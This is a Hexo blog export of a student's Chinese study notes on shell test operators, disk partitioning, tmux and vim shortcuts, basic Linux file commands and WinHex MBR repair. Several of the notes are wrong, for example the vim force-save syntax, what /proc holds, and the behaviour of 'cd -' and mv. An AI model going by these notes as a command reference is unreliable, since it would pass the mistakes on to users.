href="#文件类型判断" class="headerlink" title="文件类型判断"></a>文件类型判断</h4></li><li>-e文件是否存在（exist）</li><li>-f是否为文件（file）</li><li>-d是否为目录（directory）<h4 id="文件权限判断"><a href="#文件权限判断" class="headerlink" title="文件权限判断"></a>文件权限判断</h4></li><li>-r文件是否可读</li><li>-w文件是否可写</li><li>-x文件是否可执行</li><li>-s文件是否为非空文件，是则返回0（真），否则返回1（假）<h4 id="整数间的比较"><a href="#整数间的比较" class="headerlink" title="整数间的比较"></a>整数间的比较</h4></li><li>-eq a是否等于b（equal）(为什么不是-e，因为-e是转义，已经被使用过，-e也可以是exist中的是否存在)</li><li>-ne a是否不等于b（not equal）</li><li>-gt a是否大于b（great test）</li><li>-lt a是否小于b（less test）</li><li>-ge a是否大于等于b（great or equal）</li><li>-le a是否小于等于b (less or equal) <h3 id="注意区分expr和test"><a href="#注意区分expr和test" class="headerlink" title="注意区分expr和test"></a>注意区分expr和test</h3></li><li>expr是stdout，1表示真，0表示假（就和if一样，if内部是1即为真）</li><li>test是exit code,0表示真，非0表示假（就和return一样，return 0即为真，return 一个非0的值即为假）<h4 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h4></li><li>-z判断STRING是否为空，如果为空则返回ｔｒｕｅ</li><li>-n判断STRING是否为非空，如果为非空则返回true(-n也可以省略)</li><li>== 判断s1和s2是否相等</li><li>！=判断s1和s2是否不相等</li><li>&gt;和&lt;判断（需要用反斜杠转义），结果等于使用strcmp(逐个字符的ascii码进行比较)<h4 id="多重条件判定"><a href="#多重条件判定" class="headerlink" title="多重条件判定"></a>多重条件判定</h4></li><li>命令格式：test -r filename -a -x filename(由2，3条来链接两个test命令，第二个命令不需要test)</li><li>-a:&amp;&amp;，and</li><li>-o:||,or</li><li>!:例如test ! -x filename:当filename不可执行时，返回true<h4 id="判断符号"><a href="#判断符号" class="headerlink" title="判断符号"></a>判断符号</h4></li><li>【】和test用法几乎一样，更常用于if语句中</li><li>[]内的每一项都要用空格隔开</li><li>中括号内的变量，最好用双引号括起来（为了防止当变量中有空格时&amp;取值出现错误（too many arguments））</li><li>中括号内的常熟，最好用单或双引号括起来<h2 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h2></li><li>if then语句，（类似与c++中的if-else语句）if后面跟的是命令，不是值</li><li>if <code>expr 3 \&lt; 3</code>和if 0相同，但是0不是命令，所以无法执行</li><li>需要写if后面跟着命令 if expr 3 &lt; 3</li><li>if then elif then else fi</li><li>case $变量 in 值1）…；；值2）…；；*）…；； esac</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>磁盘管理</title>
      <link href="/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"/>
      <url>/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="磁盘管理使用"><a href="#磁盘管理使用" class="headerlink" title="磁盘管理使用"></a>磁盘管理使用</h1><h2 id="windows自带的磁盘管理"><a href="#windows自带的磁盘管理" class="headerlink" title="windows自带的磁盘管理"></a>windows自带的磁盘管理</h2><h3 id="新建简单卷"><a href="#新建简单卷" class="headerlink" title="新建简单卷"></a>新建简单卷</h3><ol><li>点击需要被分配的磁盘，右键压缩卷，输入压缩量</li><li>单击被分配出的未分配磁盘，右键新建简单卷，设置简单卷的大小（默认为最大）更改磁盘的盘符，选择按下列格式化这个卷，文件系统选NTFS（我只会恢复NTFS类型的数据，FAT版本过多就没学），点击完成<h3 id="合并磁盘"><a href="#合并磁盘" class="headerlink" title="合并磁盘"></a>合并磁盘</h3></li><li>备份后右键删除卷和拓展卷<h2 id="disk-genius"><a href="#disk-genius" class="headerlink" title="disk genius"></a>disk genius</h2></li><li>注意分区前部和后部</li><li>设置分区前部和后部之后可以从后面的展开栏中选择合并到某一个盘中</li></ol>]]></content>
      
      
      <categories>
          
          <category> 分盘 </category>
          
          <category> 磁盘管理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分盘 </tag>
            
            <tag> 磁盘管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tmux和vim工具的使用</title>
      <link href="/tmux%E5%92%8Cvim%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/tmux%E5%92%8Cvim%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="tmux和vim工具的使用"><a href="#tmux和vim工具的使用" class="headerlink" title="tmux和vim工具的使用"></a>tmux和vim工具的使用</h1><h2 id="可以脱离本地环境，直接连服务器即可"><a href="#可以脱离本地环境，直接连服务器即可" class="headerlink" title="可以脱离本地环境，直接连服务器即可"></a>可以脱离本地环境，直接连服务器即可</h2><h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ol><li>分屏</li><li>允许把终端断开之后继续运行（在tmux中写完全不需要担心断网）</li></ol><h4 id="构成"><a href="#构成" class="headerlink" title="构成"></a>构成</h4><ol><li>内部很多个session，每一个session可以开很多Window，每一个Window可以开很多个pane（pane为最小单位，即为shell对话框）</li></ol><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ol><li>直接输入tmux，就会打开一个session，其中包含一个window</li><li>切分：（有前缀键）ctrl加a/b（acterminal为a,没改的为b）后按%为左右分割；上下均分为ctrl加a/b后再双引号</li><li>关闭：选中后CTRL加d，当最后一个pane关闭时会关掉没有pane的window，最后一个window关闭时会关闭当前没有window的session</li><li>选中：鼠标光标选中，或者按前缀键后按方向键</li><li>修改分割线的位置：直接鼠标光标拖动分割线；后者按住前缀键的同时按方向键（前缀键必须按住不动，不松手）</li><li>全屏：选中想全屏的窗口后按下前缀键，后按z，进入全屏和退出全屏同理，</li><li>退出tmux：按下前缀键后按下d（不关闭tmux中的每一个pane，但是关闭tmux），再次打开：tmux+a或tmux+attach</li><li>创建一个window：ctrl加a后松开后按下c</li><li>翻阅：鼠标滚轮；前缀键加pageup或者pagedown</li><li>选中：shift+鼠标选中</li><li>复制：ctrl+insert</li><li>粘贴：shift+insert<h3 id="vim操作"><a href="#vim操作" class="headerlink" title="vim操作"></a>vim操作</h3></li><li>可以在tmux中打开，防止当断网时会丢失数据</li><li>一般命令模式：没有办法编辑，可以输入命令，每一个字母都是一个命令</li><li>编辑模式：在一般命令模式下按下i键，既可以编辑，按下esc键盘即可退出编辑模式(进入编辑模式时底部会有insert提示)</li><li>vim会自动识别代码类型，将会自动显示代码高亮</li><li>命令行模式：在一般命令模式下输入”：/?”(不包括引号)，即可进图命令行模式，命令行在最下面，可以查找，替换，保存，退出，配置编辑器（即配置编辑器的基本配置，例如行号等）等<h4 id="具体操作："><a href="#具体操作：" class="headerlink" title="具体操作："></a>具体操作：</h4></li><li>i进入编辑模式</li><li>esc进入一般命令模式，无论是编辑模式还是命令行模式</li><li>移动光标时不会在行的开头和末尾自动换行，和普通编辑器不同！！！</li><li>移动光标：1：可以直接使用小键盘的方向键盘；2：可以使用hjkl,分别代表左下上右</li><li>n<space> :n为数字，按下数字后按下空格，光标会向右移动n个字符（必须进入一般命令模式下）（到行末会自动换行），此方法为跳到第n个字符的后面！！！(如果想要删除包括第n个字符的话可以输入n-1<space>)</li><li>在一般命令模式下，按下0或home是将光标移动到本行开头，￥或end是移动到本行末尾</li><li>移动到最后一行：shift加g(即为G)</li><li>移动到某一行：用冒号加数字n或数字n加G，即将光标移动到第n行</li><li>跳过多少行：数字加回车</li><li>gg第一行，G最后一行（当访问日志时，可能数据量很大）</li><li>查找是 /word 为查找光标之下的第一个值为word的字符串，？word为查找光标之上的第一个值为word的字符串</li><li>n（小写）会重复上一次的查找操作，N（为反向重复前一次查找操作）</li><li>替换</li><li>&lt;:m,ns/word1/word2/g&gt;:在第m到第n行中查找word1字符串，并且将其替换为word2</li><li>&lt;:1,$s/word1/word2/g&gt;替换全文的word1字串为word2</li><li>&lt;:1,$s/word1/word2/gc&gt;当替换每一个word1时会要求用户确认，输入y或n可以一次替换每一次查找</li><li>&lt;:noh&gt;关闭查找关键词高亮</li><li><v>选中文本，和Windows系统的shift相同</li><li><d>删除选中的文本，和backspace相同，当删除的为某一行时，再次按p可以在鼠标光标的下一行粘贴删除的内容（类似剪切复制）</li><li><dd>删除当前行,和ctrl+d相同</li><li><y>复制选中的文本</li><li><yy>复制当前选中的行</li><li><p>post或者为<ctrl + insert>，当为<y>复制的文本时为在光标的下一个位置粘贴，当为<yy>复制的为一行时(不一定是用yy复制的一行，也可以是用z选中的完整的行)为在下一行粘贴</li><li><u>撤销（dev和pycharm都是CTRL加z）</li><li>&lt;ctrl + r&gt;==&lt;ctrl+shift+z&gt;:取消撤销（dev和pycharm也都是ctrl加y）(r可以理解为repeat,即重复)</li><li>&lt;ctrl+z&gt;挂起当前进程，即保留当前的vim条件下关闭！！！</li><li>&lt;shift+&gt;&gt;选中整体后向右移动，如果不是选中整体时为将当前行向右移动;即&lt;shift + &gt;&gt;为向右缩进一次</li><li>&lt;shift+&lt;&gt;选中后整体向左移动，如果不是选中整体时为将当前行向右移动,即&lt;shift + &lt;&gt;为想左缩进一次</li><li>&lt;:w&gt;保存，只读模式为&lt;:！&gt;来保存</li><li>&lt;:w:&gt;强制保存（有时候未获得超级管理员权限时可以强制保存）</li><li>&lt;:q&gt;退出,quit</li><li>&lt;:q:&gt;强制退出</li><li>&lt;:wq&gt;保存并退出</li><li>&lt;:set nonu&gt;取消行号，当复制时避免连带行号一起复制</li><li>&lt;:set nu&gt;恢复行号</li><li><gg> <d> <G>:删除所有文本（将光标移动到开头，设置为选中模式，再将光标移动到末尾）</li><li><gg> &lt;=&gt; <G>:全文格式化，解决当代码复制的时候出现多重缩进的问题时</li><li>paste模式：带有缩进的模式；&lt;:set paste&gt;为设置为带有自动缩进的模式，但是&lt;:set nopaste&gt;为设置不带有自动缩进的模式(要粘贴的话可以先set paste 后set nopaste)</li><li>&lt;CTRL+q&gt;当vim卡死的时候，取消当前正在执行的命令</li><li>注意区分&lt;shift+insert&gt;和<p>的区别：&lt;shift+insert&gt;可以粘贴vim外面的内容，粘贴的是系统自带的粘贴板;但是<p>只能够粘贴vim内部的内容，粘贴的是vim内部的粘贴板</li><li>&lt;ctrl + insert&gt;会复制行号，但是<p>不会复制行号<h3 id="当用vim编辑文件时，会自动创建一个-filename-swp的临时文件"><a href="#当用vim编辑文件时，会自动创建一个-filename-swp的临时文件" class="headerlink" title="当用vim编辑文件时，会自动创建一个.filename.swp的临时文件"></a>当用vim编辑文件时，会自动创建一个.filename.swp的临时文件</h3></li><li>如果打开某个文件时，如果文件的swp已经存在则会报错</li><li>解决方法：1：找到打开文件的程序并退出，2：直接删除该swp文件即可<h1 id="操作整理"><a href="#操作整理" class="headerlink" title="操作整理"></a>操作整理</h1><h2 id="很重要的翻页操作（当自己没有鼠标时非常实用）"><a href="#很重要的翻页操作（当自己没有鼠标时非常实用）" class="headerlink" title="很重要的翻页操作（当自己没有鼠标时非常实用）"></a>很重要的翻页操作（当自己没有鼠标时非常实用）</h2></li><li>在terminal中&lt;shift+pageup&gt;/&lt;shift+pagedown&gt;实现翻页（记住terminal中用shift）</li><li>在vim中用前缀键加<pageup>/<pagedown>来实现(记住vim中用前缀键) <h2 id="使用的最大化pane窗口操作"><a href="#使用的最大化pane窗口操作" class="headerlink" title="使用的最大化pane窗口操作"></a>使用的最大化pane窗口操作</h2></li><li>&lt;ctrl + z&gt;,最大化与退出最大化同样操作（z可以理解为最）<h2 id="关闭操作："><a href="#关闭操作：" class="headerlink" title="关闭操作："></a>关闭操作：</h2></li><li>vim的关闭为&lt;:wq&gt;(保存并退出)&lt;:q&gt;（直接退出）（详细上面有直接操作）</li><li>pane的关闭：&lt;ctrl + a + x&gt;(前缀键加x)</li><li>window的关闭&lt;ctrl + b + &amp;&gt;(前缀键加&amp;)</li><li>以上两条一般会提示是否关闭，y/n</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tmux </category>
          
          <category> vim </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> tmux </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用文件管理命令</title>
      <link href="/%E5%B8%B8%E7%94%A8%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4md/"/>
      <url>/%E5%B8%B8%E7%94%A8%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4md/</url>
      
        <content type="html"><![CDATA[<h1 id="常用文件文件名"><a href="#常用文件文件名" class="headerlink" title="常用文件文件名"></a>常用文件文件名</h1><h2 id=""><a href="#" class="headerlink" title="/"></a>/</h2><ol><li>根目录<h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2></li><li> 用于存放可执行文件命令</li></ol><h2 id="ect"><a href="#ect" class="headerlink" title="ect"></a>ect</h2><ol><li>配置文件，类似于config文件</li><li>内部常常有nginx文件夹，存放应用的各种配置<h2 id="var"><a href="#var" class="headerlink" title="var"></a>var</h2></li><li>log文件夹中存放各种日志</li></ol><h2 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h2><ol><li>用于存放安装包，类似于py的模块和c的头文件</li></ol><h2 id="home"><a href="#home" class="headerlink" title="home"></a>home</h2><ol><li>所有用户的家目录</li></ol><h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><ol><li>存放配置文件</li><li>例如Linux系统下存放cpu信息的cpuinfo，win系统可以直接通过我的电脑中的属性来查看</li></ol><p>##注意区分家目录和根目录</p><ol><li>家目录是根目录的一个分支，一个家目录下可以有多个用户分支</li></ol><p><img src="https://img-blog.csdnimg.cn/20200224172609484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0N1aXlhbmJpbmcx,size_16,color_FFFFFF,t_70"></p><h1 id="路径概念"><a href="#路径概念" class="headerlink" title="路径概念"></a>路径概念</h1><h2 id="路径描述："><a href="#路径描述：" class="headerlink" title="路径描述："></a>路径描述：</h2><ol><li>绝对路径：从根目录开始描述（文件后面要带斜杠，不是文件名的开头）pwd为绝对路劲</li><li>相对路径：从当前路径开始描述路径</li><li>二者之间的区别：开头是斜杠是绝对路径，不是斜杠就一定是相对路径<h2 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h2></li><li>一个点表示当前目录，两个点表示上级目录，即”../“,而”./“表示当前目录</li><li>例子：../temp/./temp/main.cpp:意为返回temp的上级目录后切回temp，后保留在temp，后在temp中找到main.cpp文件</li><li>~/波浪号加斜杠表示返回家目录<h1 id="常用文件管理指令"><a href="#常用文件管理指令" class="headerlink" title="常用文件管理指令"></a>常用文件管理指令</h1><h2 id="ctrl-c"><a href="#ctrl-c" class="headerlink" title="ctrl+c"></a>ctrl+c</h2></li><li>终止杀掉当前进程，传入终止信号，可以直接跟在一个指令后面，2. 此指令可以直接终止，换行并清空<h2 id="CTRL-U"><a href="#CTRL-U" class="headerlink" title="CTRL+U"></a>CTRL+U</h2></li><li>可以直接清空本行，终端中直接显示</li></ol><h2 id="tab键"><a href="#tab键" class="headerlink" title="tab键"></a>tab键</h2><ol><li>补全指令或路径（可以写两个字母就试一个tab）</li><li>条件：系统发现如果有多种选项选择则不会执行，单个选项则执行</li></ol><h2 id="方向键"><a href="#方向键" class="headerlink" title="方向键"></a>方向键</h2><ol><li>上可以直接还原上一条命令</li></ol><h2 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h2><ol><li>展示当前列表（ls可以理解为list）</li><li>ls -l：表示展示当前文件的详细信息</li><li>ls -lh:人性化去输出，即可以不同内存单元大小互相切换</li><li>ls -a:显示所有文件，所有以”.”开头的文件即为隐藏文件？（all）</li><li>ls -A:不显示当前文件的目录，显示其下属的文件的隐藏文件？</li><li>ll:ls -la的简写<h2 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h2></li><li>显示当前绝对路径<h2 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h2></li><li>changediractory的简写，意思为切换路径</li><li>后面既可以是相对路径，也可以是绝对路径</li><li>cd -:意思为返回上一个，注意，只能是返回上一级，不是多级<h2 id="cp："><a href="#cp：" class="headerlink" title="cp："></a>cp：</h2></li><li>复制加粘贴加重命名命令</li><li>格式：cp p1 p2，注意空格位置<h2 id="mkdir："><a href="#mkdir：" class="headerlink" title="mkdir："></a>mkdir：</h2></li><li>既可以根据相对路径创建，也可以根据绝对路径来创建</li><li>创建a里有b，b里有c的：mkdir a/b/c</li><li>如果存在则跳过不报错，没有则生成</li><li>创建多级文件夹需要加上-p，否则报错</li></ol><h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h2><ol><li>rm 待删除 -r：递归方式删除</li><li>注意，rm 待删除 -f为强制删除，无论其是否是保护文件，不要轻易使用，可能回产生无法挽回的局面</li><li>rm a/<em>:加上</em>意为删除所有文件，该句意为删除a文件夹下所有文件</li><li>rm a -r 删除文件夹rm a 删除文件rm *.txt,删除当前文件夹下的所有.txt类型的文件，如果加*但是不加文件类型后缀则为删除当前文件夹下所有文件<h2 id="touch创建文件"><a href="#touch创建文件" class="headerlink" title="touch创建文件"></a>touch创建文件</h2></li><li>注意区分mkdir和touch，mkdir是创建文件夹而touch为创建文件</li><li>创建文件时要加上文件类型，例如.txt,.png等<h2 id="mv命令："><a href="#mv命令：" class="headerlink" title="mv命令："></a>mv命令：</h2></li><li>mv p1 p2:将p1中的内容移入p2中</li><li>mv a/tmp.txt b/:将a中的tmp移动至b中，find a结果将只有a，find b的结果将有b，b/tmp.txt(b下有tmp.txt文件)</li><li>注意区分cp和mv，cp是将A复制给B，而mv是将A移动至B</li><li>mv tmp.txt tmp.cpp,可以将tmp.txt中的内容复制到tmp.txt中<h2 id="cat命令："><a href="#cat命令：" class="headerlink" title="cat命令："></a>cat命令：</h2></li><li>看文件中写的内容<h2 id="对文件操作要加-r"><a href="#对文件操作要加-r" class="headerlink" title="对文件操作要加-r"></a>对文件操作要加-r</h2></li><li>例如：rm -r dir_a dir_b dir_c,为删除文件夹dir_a dir_b dir_c三个文件夹</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>winhex</title>
      <link href="/winhex/"/>
      <url>/winhex/</url>
      
        <content type="html"><![CDATA[<h1 id="文件系统："><a href="#文件系统：" class="headerlink" title="文件系统："></a>文件系统：</h1><pre><code>NTFS存储较有逻辑性</code></pre><h2 id="分配内存大小"><a href="#分配内存大小" class="headerlink" title="分配内存大小"></a>分配内存大小</h2><h2 id="创建虚拟磁盘："><a href="#创建虚拟磁盘：" class="headerlink" title="创建虚拟磁盘："></a>创建虚拟磁盘：</h2><pre><code>１：右键此电脑２：管理３：右键磁盘管理，点击创建ＶＨＤ４：右键新创建的磁盘，初始化１选择MBR（不是GPT）5：新建简单卷（简单卷大小不用管，NTFS可以选FAT３２）</code></pre><h2 id="底层数据MBR："><a href="#底层数据MBR：" class="headerlink" title="底层数据MBR："></a>底层数据MBR：</h2><p>——————————————————————————</p><h3 id="第二个是启动某一个文件功能，打开后可以查看到底层数据"><a href="#第二个是启动某一个文件功能，打开后可以查看到底层数据" class="headerlink" title="第二个是启动某一个文件功能，打开后可以查看到底层数据"></a>第二个是启动某一个文件功能，打开后可以查看到底层数据</h3><p>——————————————————————————<br>##</p><ol><li>查找中含有区分大小写，按照ASCII码（美国信息交换标准代码）和UNICODE两种编码，因为大多数是美国微软公司，所以可以</li><li>选择ASCII；查找中按f3即可启动查找，当找到一个目标值的时候即会暂停，再次点击f3即可再次启动搜索 <h2 id="注意区分搜索文本和搜索十六进制数值"><a href="#注意区分搜索文本和搜索十六进制数值" class="headerlink" title="注意区分搜索文本和搜索十六进制数值"></a>注意区分搜索文本和搜索十六进制数值</h2></li><li>Find hex values:<br> 可以搜索底层数据中十六进制的某一个数值（记住，十六进制每一位数都是偶数位，不会出现奇数的情况）</li><li>扇区：<h2 id="每512个字节是一个扇区，"><a href="#每512个字节是一个扇区，" class="headerlink" title="每512个字节是一个扇区，"></a>每512个字节是一个扇区，</h2></li><li>——————————————————————————————————————<h2 id="查找时可以选择偏移变量："><a href="#查找时可以选择偏移变量：" class="headerlink" title="查找时可以选择偏移变量："></a>查找时可以选择偏移变量：</h2></li><li>即到那个字节，从哪个字节，可以提高搜索速度，缩短搜索时间</li><li>跳转功能： </li><li>点击左边可以十进制和十六进制互相转换： </li><li>也可以使用导航——》跳至——》选择文本开始或末尾</li><li>看最上面的一栏即可判断是十进制还是十六进制： </li><li>跳转到某一个扇区功能： ，单位如果是sector则为以分区为单位</li><li>返回上一步或下一步操作：</li></ol><p>———————————————————————————————————————</p><h2 id="Datainterpreter-数据解释器，视图（V）——-gt-显示（Show）——数据解释器"><a href="#Datainterpreter-数据解释器，视图（V）——-gt-显示（Show）——数据解释器" class="headerlink" title="Datainterpreter:数据解释器，视图（V）——&gt;显示（Show）——数据解释器"></a>Datainterpreter:数据解释器，视图（V）——&gt;显示（Show）——数据解释器</h2><h2 id="另：winhex自带计算器caculator"><a href="#另：winhex自带计算器caculator" class="headerlink" title="另：winhex自带计算器caculator;"></a>另：winhex自带计算器caculator;</h2><h2 id="注意，这里的粘贴时ctrl-B-不是ctrl-V"><a href="#注意，这里的粘贴时ctrl-B-不是ctrl-V" class="headerlink" title="注意，这里的粘贴时ctrl+B!!!!!!!!!!!!!!!!!不是ctrl+V"></a>注意，这里的粘贴时ctrl+B!!!!!!!!!!!!!!!!!不是ctrl+V</h2><pre><code>1. 意思和写入相同</code></pre><h2 id="MBR：计算机开机访问硬盘时所必须要读取的首个扇区（0柱面，0磁头，1扇区）"><a href="#MBR：计算机开机访问硬盘时所必须要读取的首个扇区（0柱面，0磁头，1扇区）" class="headerlink" title="MBR：计算机开机访问硬盘时所必须要读取的首个扇区（0柱面，0磁头，1扇区）"></a>MBR：计算机开机访问硬盘时所必须要读取的首个扇区（0柱面，0磁头，1扇区）</h2><pre><code>2. 硬盘是由多个盘片组成的，每个盘片是由多个扇区组成的，每个盘片上由多个磁道（同心圆</code></pre><h2 id="MBR扇区分为"><a href="#MBR扇区分为" class="headerlink" title="MBR扇区分为"></a>MBR扇区分为</h2><ol><li>引导程序，计算机启动后读取，如果磁盘数据不对的话会死机，如果非虚拟磁盘的MBR清除的话会死机</li><li>磁盘签名：系统在对硬盘初始化时写入的标签，系统依靠标签来识别磁盘（如果磁盘签名丢失会认为硬盘未初始化）</li><li>分区表：管理硬盘的分区，如果被破坏则分区会丢失</li><li>55AA：结束标志，执行MBR引导程序时，如果最后是55AA才会继续读取下一个分区</li><li>从后往前看，最后两个字节为结束标志，再往前走64个字节是分区表（往前走三行），再往前走两个是磁盘签名。再往前是引导程序</li></ol><h1 id="字节偏移："><a href="#字节偏移：" class="headerlink" title="字节偏移："></a>字节偏移：</h1><pre><code>十六进制表示，0x后面两位是横向表示，后面的是纵向表示</code></pre><p>0x01BE：01B是横向，E是纵向</p><h1 id="修复MBR："><a href="#修复MBR：" class="headerlink" title="修复MBR："></a>修复MBR：</h1><pre><code>正常的磁盘都是初始化的，如果不小心按了初始化则相当于格式化了磁盘，MBR全部清0，</code></pre><h2 id="分区总大小-–-分区的起始分区好-分区的大小"><a href="#分区总大小-–-分区的起始分区好-分区的大小" class="headerlink" title="分区总大小 – 分区的起始分区好==分区的大小"></a>分区总大小 – 分区的起始分区好==分区的大小</h2><h2 id="修复中最重要的是修复文件系统类型，分区扇区号和分区总大小，注意最后的55AA"><a href="#修复中最重要的是修复文件系统类型，分区扇区号和分区总大小，注意最后的55AA" class="headerlink" title="修复中最重要的是修复文件系统类型，分区扇区号和分区总大小，注意最后的55AA"></a>修复中最重要的是修复文件系统类型，分区扇区号和分区总大小，注意最后的55AA</h2><h2 id="最后两位是55AA，固定的"><a href="#最后两位是55AA，固定的" class="headerlink" title="最后两位是55AA，固定的"></a>最后两位是55AA，固定的</h2><h2 id="往前走64个字节是分区表，管理磁盘的分区"><a href="#往前走64个字节是分区表，管理磁盘的分区" class="headerlink" title="往前走64个字节是分区表，管理磁盘的分区"></a>往前走64个字节是分区表，管理磁盘的分区</h2><h2 id="再往前走4个字节是磁盘签名"><a href="#再往前走4个字节是磁盘签名" class="headerlink" title="再往前走4个字节是磁盘签名"></a>再往前走4个字节是磁盘签名</h2><h1 id="＊＊＊＊＊＊＊＊＊＊"><a href="#＊＊＊＊＊＊＊＊＊＊" class="headerlink" title="＊＊＊＊＊＊＊＊＊＊"></a>＊＊＊＊＊＊＊＊＊＊</h1><p>硬盘分区详解：<br>    硬盘分区表由四项组成，每项共１６个字节，共４＊１６＝＝６４个字节，每项描述一个分区的基本信息(80) (01 01 00) (07) (FE FF FF) (3F 00 00 00) (82 C1 3B 3A)<br>磁头，扇区，柱面</p><h1 id="＊＊＊＊＊存贮字节位＊＊＊＊＊＊"><a href="#＊＊＊＊＊存贮字节位＊＊＊＊＊＊" class="headerlink" title="＊＊＊＊＊存贮字节位＊＊＊＊＊＊"></a>＊＊＊＊＊存贮字节位＊＊＊＊＊＊</h1><h2 id="第1字节：引导标志。若值为80H表示活动分区，若值为00H表示非活动分区。"><a href="#第1字节：引导标志。若值为80H表示活动分区，若值为00H表示非活动分区。" class="headerlink" title="第1字节：引导标志。若值为80H表示活动分区，若值为00H表示非活动分区。"></a>第1字节：引导标志。若值为80H表示活动分区，若值为00H表示非活动分区。</h2><h2 id="第2、3、4字节：本分区的起始磁头号、扇区号、柱面号。其中："><a href="#第2、3、4字节：本分区的起始磁头号、扇区号、柱面号。其中：" class="headerlink" title="第2、3、4字节：本分区的起始磁头号、扇区号、柱面号。其中："></a>第2、3、4字节：本分区的起始磁头号、扇区号、柱面号。其中：</h2><pre><code>磁头号——第2字节；扇区号——第3字节的低6位；柱面号——为第3字节高2位+第4字节8位。第5字节分区类型符。00H——表示该分区未用（即没有指定）；06H——FAT16基本分区；0BH——FAT32基本分区；05H——扩展分区；07H——NTFS分区；0FH——（LBA模式）扩展分区（83H为Linux分区等）。</code></pre><h2 id="第6、7、8字节"><a href="#第6、7、8字节" class="headerlink" title="第6、7、8字节"></a>第6、7、8字节</h2><h2 id="本分区的结束磁头号、扇区号、柱面号。其中："><a href="#本分区的结束磁头号、扇区号、柱面号。其中：" class="headerlink" title="本分区的结束磁头号、扇区号、柱面号。其中："></a>本分区的结束磁头号、扇区号、柱面号。其中：</h2><pre><code>磁头号——第6字节；扇区号——第7字节的低6位；柱面号——第7字节的高2位+第8字节。</code></pre><h2 id="第9、10、11、12字节"><a href="#第9、10、11、12字节" class="headerlink" title="第9、10、11、12字节"></a>第9、10、11、12字节</h2><h2 id="逻辑起始扇区号-，本分区之前已用了的扇区数。"><a href="#逻辑起始扇区号-，本分区之前已用了的扇区数。" class="headerlink" title="逻辑起始扇区号 ，本分区之前已用了的扇区数。"></a>逻辑起始扇区号 ，本分区之前已用了的扇区数。</h2><h2 id="第13、14、15、16字节"><a href="#第13、14、15、16字节" class="headerlink" title="第13、14、15、16字节"></a>第13、14、15、16字节</h2><h1 id="本分区的总扇区数。"><a href="#本分区的总扇区数。" class="headerlink" title="本分区的总扇区数。"></a>本分区的总扇区数。</h1><h1 id="紫色的是分盘区，蓝色的是磁盘签名"><a href="#紫色的是分盘区，蓝色的是磁盘签名" class="headerlink" title="紫色的是分盘区，蓝色的是磁盘签名"></a>紫色的是分盘区，蓝色的是磁盘签名</h1><h1 id="磁盘签名可能会每一次打开都不一样，视情况而定"><a href="#磁盘签名可能会每一次打开都不一样，视情况而定" class="headerlink" title="磁盘签名可能会每一次打开都不一样，视情况而定"></a>磁盘签名可能会每一次打开都不一样，视情况而定</h1><h1 id="分区表："><a href="#分区表：" class="headerlink" title="分区表："></a>分区表：</h1><p>这里不同的分区我打上了不同的颜色书签，从磁盘签名往后空两个字节开始是磁盘分区的地方，<br>第三个扇区是逻辑扇区：EBR</p><h1 id="数据解释器：-第一位是数据转为10进制后的大小第二位是扇区位置，第三位是扇区大小"><a href="#数据解释器：-第一位是数据转为10进制后的大小第二位是扇区位置，第三位是扇区大小" class="headerlink" title="数据解释器： 第一位是数据转为10进制后的大小第二位是扇区位置，第三位是扇区大小"></a>数据解释器： 第一位是数据转为10进制后的大小第二位是扇区位置，第三位是扇区大小</h1><h1 id="磁盘总大小减去分区的起始扇区号-分区大小"><a href="#磁盘总大小减去分区的起始扇区号-分区大小" class="headerlink" title="磁盘总大小减去分区的起始扇区号 == 分区大小"></a>磁盘总大小减去分区的起始扇区号 == 分区大小</h1><h1 id="概要："><a href="#概要：" class="headerlink" title="概要："></a>概要：</h1><pre><code>1：创建一个新的磁盘2：将新建磁盘的MBR赋值到被破坏的磁盘的MBR3：修改被破坏的磁盘的MBR磁盘签名（只需要和复制的不一样即可）４：找到该磁盘第一个分区的起始扇区５：从该起始扇区得知文件系统，起始扇区号，分区大小6:将这些数据填入MBR的分区表中７：保存，在磁盘管理出进行刷新</code></pre>]]></content>
      
      
      <categories>
          
          <category> 文件修复 </category>
          
          <category> winhex </category>
          
          <category> 进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件修复 </tag>
            
            <tag> winhex </tag>
            
            <tag> 进制 </tag>
